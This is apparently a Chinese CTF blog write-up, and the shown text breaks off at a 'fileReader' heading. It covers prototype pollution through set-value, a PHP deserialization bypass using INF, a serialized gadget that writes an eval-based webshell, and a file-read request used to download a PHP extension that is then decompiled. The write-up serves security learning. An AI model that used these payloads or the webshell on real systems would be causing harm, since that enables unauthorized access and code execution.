<p>set-value 的版本比较: <a target="_blank" rel="noopener" href="https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f">https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f</a></p>
<p>POC:</p>
<p><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7182####toc-4">https://xz.aliyun.com/t/7182####toc-4</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">&quot;password1&quot;</span>:process.env.p1,</span><br><span class="line">    <span class="string">&quot;password2&quot;</span>:process.env.p2,</span><br><span class="line">    <span class="string">&quot;password3&quot;</span>:process.env.p3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>/SpawnPoint</code></p>
</li>
<li><p><code>/Privilege</code></p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;NewAttributeKey&quot;</span>:<span class="string">&quot;__proto__.fe1w0&quot;</span>,<span class="attr">&quot;NewAttributeValue&quot;</span>:<span class="string">&quot;xzaslxr1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>/DeveloperControlPanel</code></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;key&quot;</span>:<span class="string">&quot;fe1w0&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;xzaslxr1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>题外话,在Y1ng师傅博客那边又学到个新知识</p>
<blockquote>
<p><code>npm aduit</code>主要做的就是把需要检查的依赖信息发送给一个官方检查接口, 该结构会在历史上报的漏洞数据库中判断当前依赖信息是否含有漏洞，然后生成一个包含包名称、漏洞严重性、简介、路径等的漏洞报告反馈给开发者。</p>
</blockquote>
<p><img src="http://img.xzaslxr.xyz/img/1.png" alt="img"></p>
<p>题目源代码:<a target="_blank" rel="noopener" href="http://xzaslxr.xyz/wp-content/uploads/2020/09/LittleGame_app.zip">http://xzaslxr.xyz/wp-content/uploads/2020/09/LittleGame_app.zip</a> 感兴趣的老哥,可以试试</p>
<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>可以利用php 的无穷大来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;d:INF;s:6:&quot;trick2&quot;;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>论证:</p>
<p><img src="http://img.xzaslxr.xyz/img/qqqqq.png" alt="qqqqq"></p>
<p>此外,利用<code>NaN</code>也行  from  Y1ng 师傅wp</p>
<blockquote>
<p>NaN “不是数字”并不意味着查看数据类型是否为数值型/文本型/等等。</p>
<p>NaN实际上是一组可以存储在浮点变量中的值，但实际上并不计算为一个合适的浮点数。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(is_nan((<span class="keyword">float</span>)<span class="string">&#x27;NaN&#x27;</span>));</span><br><span class="line">php shell code:<span class="number">1</span>:</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>思路与wm2020的webweb相似,不同的是通过写webshell</p>
<p>而非rce。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        $dir = <span class="number">1</span>,</span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">&quot;fe1w0.php&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;&lt;?php eval(\$_GET[&#x27;a&#x27;]);?&gt;&quot;</span>=&gt;<span class="number">123</span>)),</span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode((serialize($a)));</span><br></pre></td></tr></table></figure>

<p>主要利用jip.php中的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$file,<span class="keyword">array</span> $data=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;dir || <span class="keyword">$this</span>-&gt;lazy)</span><br><span class="line">		<span class="keyword">return</span> count(<span class="keyword">$this</span>-&gt;data[$file]=$data);</span><br><span class="line">	$fw=\Base::instance();</span><br><span class="line">	<span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;format) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="built_in">self</span>::FORMAT_JSON:</span><br><span class="line">			$out=json_encode($data,JSON_PRETTY_PRINT);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="built_in">self</span>::FORMAT_Serialized:</span><br><span class="line">			$out=$fw-&gt;serialize($data);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $fw-&gt;write(<span class="keyword">$this</span>-&gt;dir.$file,$out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazy) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;data?:[] <span class="keyword">as</span> $file =&gt; $data)</span><br><span class="line">			<span class="keyword">$this</span>-&gt;write($file,$data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="🎣杯"><a href="#🎣杯" class="headerlink" title="🎣杯"></a>🎣杯</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a><strong>gamebox</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>])) &#123;</span><br><span class="line">    gamebox($_GET[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">//没有get到这个是干什么用的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    fileReader($_GET[<span class="string">&#x27;f&#x27;</span>]);<span class="comment">// 可以用来读取文件,php格式的也行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读进程信息</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?f=/proc/self/maps</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 122.112.218.163:10080</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4231.0 Safari/537.36 Edg/86.0.615.3</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 27 Aug 2020 01:35:12 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.38 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/7.2.33</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 53572</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">55f1df1ed000-55f1df222000 r--p 00000000 fd:01 664673                     /usr/sbin/apache2</span><br><span class="line">55f1df222000-55f1df26c000 r-xp 00035000 fd:01 664673                     /usr/sbin/apache2</span><br><span class="line">55f1df26c000-55f1df28e000 r--p 0007f000 fd:01 664673                     /usr/sbin/apache2</span><br><span class="line">55f1df28f000-55f1df292000 r--p 000a1000 fd:01 664673                     /usr/sbin/apache2</span><br><span class="line">55f1df292000-55f1df296000 rw-p 000a4000 fd:01 664673                     /usr/sbin/apache2</span><br><span class="line">55f1df296000-55f1df299000 rw-p 00000000 00:00 0 </span><br><span class="line">55f1dfbca000-55f1dfdb1000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">55f1dfdb1000-55f1dfdd6000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f40c85b0000-7f40c85b1000 r--p 00000000 fd:01 664640                     /usr/lib/x86_64-linux-gnu/libicudata.so.63.1</span><br><span class="line">7f40c85b1000-7f40c85b2000 r-xp 00001000 fd:01 664640                     /usr/lib/x86_64-linux-gnu/libicudata.so.63.1</span><br><span class="line">7f40c85b2000-7f40c9f9e000 r--p 00002000 fd:01 664640                     /usr/lib/x86_64-linux-gnu/libicudata.so.63.1</span><br><span class="line">7f40c9f9e000-7f40c9f9f000 r--p 019ed000 fd:01 664640                     /usr/lib/x86_64-linux-gnu/libicudata.so.63.1</span><br><span class="line">7f40c9f9f000-7f40c9fa0000 rw-p 019ee000 fd:01 664640                     /usr/lib/x86_64-linux-gnu/libicudata.so.63.1</span><br><span class="line">7f40c9fa0000-7f40c9fc7000 rw-p 00000000 00:00 0 </span><br><span class="line">7f40c9fc7000-7f40c9fca000 r--p 00000000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fca000-7f40c9fd1000 r-xp 00003000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fd1000-7f40c9fd3000 r--p 0000a000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fd3000-7f40c9fd4000 ---p 0000c000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fd4000-7f40c9fd5000 r--p 0000c000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fd5000-7f40c9fd6000 rw-p 0000d000 fd:01 529216                     /lib/x86_64-linux-gnu/libnss_files-2.28.so</span><br><span class="line">7f40c9fd6000-7f40ca00c000 rw-p 00000000 00:00 0 </span><br><span class="line">7f40ca014000-7f40ca016000 rw-p 00000000 00:00 0 </span><br><span class="line">7f40ca907000-7f40ca90a000 r--p 00000000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca90a000-7f40ca91b000 r-xp 00003000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca91b000-7f40ca91e000 r--p 00014000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca91e000-7f40ca91f000 ---p 00017000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca91f000-7f40ca920000 r--p 00017000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca920000-7f40ca921000 rw-p 00018000 fd:01 529194                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7f40ca921000-7f40ca9aa000 r--p 00000000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40ca9aa000-7f40caa56000 r-xp 00089000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40caa56000-7f40caa94000 r--p 00135000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40caa94000-7f40caa95000 ---p 00173000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40caa95000-7f40caa9f000 r--p 00173000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40caa9f000-7f40caaa1000 rw-p 0017d000 fd:01 529944                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">7f40caaa1000-7f40caaa5000 rw-p 00000000 00:00 0 </span><br><span class="line">7f40cb5fb000-7f40cb5fe000 r-xp 00000000 fd:01 787516                     /usr/local/lib/php/extensions/no-debug-non-zts-20170718/FileReader.so</span><br><span class="line">7f40cb5fe000-7f40cb7fe000 ---p 00003000 fd:01 787516                     /usr/local/lib/php/extensions/no-debug-non-zts-20170718/FileReader.so</span><br><span class="line">7f40cb7fe000-7f40cb7ff000 r--p 00003000 fd:01 787516                     /usr/local/lib/php/extensions/no-debug-non-zts-20170718/FileReader.so</span><br><span class="line">7f40cb7ff000-7f40cb800000 rw-p 00004000 fd:01 787516                     /usr/local/lib/php/extensions/no-debug-non-zts-20170718/FileReader.so</span><br></pre></td></tr></table></figure>

<ul>
<li>FileReader.so 下载</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl.exe http://<span class="number">122.112</span>.<span class="number">218.163</span>:<span class="number">10080</span>/?f=/usr/local/lib/php/extensions/no<span class="literal">-debug</span><span class="literal">-non</span><span class="literal">-zts</span><span class="literal">-20170718</span>/FileReader.so -<span class="literal">-output</span> D:<span class="number">1</span>.so</span><br></pre></td></tr></table></figure>

<p>当你IDA启动时,会发现这是道webpwn</p>
<ul>
<li>gamebox</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">zif_gamebox</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi@6</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax@6</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx@6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v6; <span class="comment">// [sp+0h] [bp-E78h]@1</span></span><br><span class="line">  __int64 v7; <span class="comment">// [sp+8h] [bp-E70h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+10h] [bp-E68h]@4</span></span><br><span class="line">  __int64 v9[<span class="number">256</span>]; <span class="comment">// [sp+410h] [bp-A68h]@4</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">511</span>]; <span class="comment">// [sp+C10h] [bp-268h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+E0Fh] [bp-69h]@4</span></span><br><span class="line">  __int64 v12; <span class="comment">// [sp+E58h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v12 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x240</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( zend_parse_parameters(*(_DWORD *)(a1 + <span class="number">44</span>), (__int64)<span class="string">&quot;s&quot;</span>, (__int64)&amp;v6, (__int64)&amp;v7) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v7 &gt; <span class="number">0x200</span> )</span><br><span class="line">      qmemcpy(v10, v6, <span class="number">0x200</span>uLL);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __memcpy_chk((__int64)v10, (__int64)v6, v7, <span class="number">576L</span>L);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    qmemcpy(v8, &amp;unk_2900, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">    qmemcpy(v9, &amp;off_2040A0, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v1 + <span class="number">1</span>;</span><br><span class="line">      v3 = &amp;v10[v1];</span><br><span class="line">      v4 = *v3;</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">44</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 += <span class="number">2</span>;</span><br><span class="line">        *v3 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">511</span> )</span><br><span class="line">LABEL_8:</span><br><span class="line">          JUMPOUT(__CS__, v9[v10[<span class="number">0</span>]]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *v3 = v8[v4];</span><br><span class="line">        ++v1;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">511</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>fileReader</li>
</ul>
